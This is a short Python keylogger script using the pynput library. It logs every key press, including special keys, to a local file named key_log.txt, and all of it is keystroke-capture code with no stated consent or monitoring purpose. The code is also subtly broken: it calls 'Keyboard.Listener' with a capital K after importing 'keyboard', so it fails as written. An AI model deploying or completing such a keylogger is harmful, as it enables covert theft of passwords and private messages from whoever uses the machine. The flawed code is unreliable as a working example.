from pynput import keyboard

# This function is called whenever a key is pressed
def on_press(key):
	try:
		with open("key_log.txt", "a") as log_file:
			log_file.write(f"{key.char}")
	except AttributeError:
		# Handles special keys like space, enter, ect.
		with open("key_log.txt", "a") as log_file:
			log_file.write(f" [{key}] ")
 # Start listening to keyboard events
with Keyboard.Listener(on_press=on_press) as listener:
	listener.join()
